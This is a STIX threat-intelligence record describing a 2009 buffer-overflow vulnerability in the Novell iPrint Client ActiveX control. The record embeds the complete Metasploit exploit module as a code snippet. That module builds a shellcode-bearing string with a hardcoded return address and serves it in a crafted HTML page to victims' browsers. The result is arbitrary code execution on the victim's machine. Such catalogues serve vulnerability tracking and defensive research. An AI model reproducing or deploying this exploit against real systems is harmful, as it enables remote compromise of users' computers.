{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7b0b2909-b70e-4308-86d7-2e2a13a3a4d9",
    "created": "2024-08-14T16:44:44.066544Z",
    "modified": "2024-08-14T16:44:44.066549Z",
    "name": "Novell iPrint Client ActiveX Control Date/Time Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Novell iPrint Client 5.30. When passing a specially crafted date/time string via certain parameters to ienipp.ocx an attacker can execute arbitrary code.  NOTE: The \"operation\" variable must be set to a valid command in order to reach this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/novelliprint_datetime.rb",
            "external_id": "novelliprint_datetime.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1569"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20091213033620/http://secunia.com:80/advisories/35004"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell iPrint Client ActiveX Control Date/Time Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in Novell iPrint Client 5.30. When\n        passing a specially crafted date/time string via certain parameters to ienipp.ocx\n        an attacker can execute arbitrary code.\n\n        NOTE: The \"operation\" variable must be set to a valid command in order to reach this\n        vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-1569' ],\n          [ 'BID', '37242' ],\n          [ 'OSVDB', '60804' ],\n          [ 'URL', 'http://web.archive.org/web/20091213033620/http://secunia.com:80/advisories/35004' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 512,\n          'BadChars'      => \"\\x00=:;,\", # these are used in a strtok\n          'PrependEncoder' => \"\\x81\\xc4\\xf0\\xef\\xff\\xff\",\n          'DisableNops'   => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'iPrint 5.30 Windows Client', { 'Ret' => 0x1005ad5b } ] # jmp esp in ienipp.ocx v5.30\n        ],\n      'DisclosureDate' => '2009-12-08',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    sploit = \"volatile-date-time\"\n    sploit << make_nops(60)\n    # this should end up \"\\xeb\\x04\"\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+6\").encode_string\n    sploit << [target.ret].pack('V')\n    sploit << p.encoded\n\n    operations = [\n      \"op-client-interface-version\",\n      \"op-client-version-info\",\n      \"op-client-is-printer-installed\",\n      \"op-user-get-role\",\n      \"op-printer-install\",\n      \"op-printer-remove\",\n      \"op-printer-get-status\",\n      \"op-printer-get-info\",\n      \"op-printer-pause\",\n      \"op-printer-resume\",\n      \"op-printer-purge-jobs\",\n      \"op-printer-list-users-jobs\",\n      \"op-printer-list-all-jobs\",\n      \"op-printer-send-test-page\",\n      \"op-printer-send-file\",\n      \"op-printer-setup-install\",\n      \"op-job-get-info\",\n      \"op-job-hold\",\n      \"op-job-release-hold\",\n      \"op-job-cancel\",\n      \"op-job-restart\",\n      \"op-dbg-printer-get-all-attrs\",\n      \"op-dbg-job-get-all-attrs\"\n    ]\n    operation = operations[rand(operations.length)]\n\n    # escape single quotes\n    sploit = xml_encode(sploit)\n\n    content = %Q|<html>\n<object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C'>\n<param name='operation' value='#{operation}' />\n<param name='persistence' value='#{sploit}' />\n</object>\n</html>\n|\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def xml_encode(str)\n    ret = \"\"\n    str.unpack('C*').each { |ch|\n      case ch\n      when 0x41..0x5a, 0x61..0x7a, 0x30..0x39\n        ret << ch.chr\n      else\n        ret << \"&#x\"\n        ret << ch.chr.unpack('H*')[0]\n        ret << \";\"\n      end\n    }\n    ret\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-12-08",
    "x_mitre_platforms": [
        "win'"
    ]
}